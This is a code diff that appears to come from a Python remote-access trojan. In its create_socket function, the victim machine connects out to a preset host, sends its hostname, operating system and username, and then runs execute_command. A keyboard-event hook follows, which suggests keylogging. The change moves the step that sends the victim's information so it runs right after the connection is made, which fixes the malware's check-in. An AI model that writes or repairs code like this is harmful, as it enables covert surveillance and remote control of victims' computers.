@@ -27,13 +27,14 @@ def create_socket():
     try:
         objSocket = socket.socket()
         objSocket.connect((strHost, intPort))
+        strUserInfo = socket.gethostname() + "`," + platform.system() + " " + platform.release() + "`," + os.environ["USERNAME"]
+        objSocket.send(str.encode(strUserInfo))
+        del strUserInfo
         execute_command()
     except socket.error:
         return
 
-    strUserInfo = socket.gethostname() + "`," + platform.system() + " " + platform.release() + "`," + os.environ["USERNAME"]
-    objSocket.send(str.encode(strUserInfo))
-    del strUserInfo  # delete data after it has been sent
+      # delete data after it has been sent
 
 
 def OnKeyboardEvent(event):
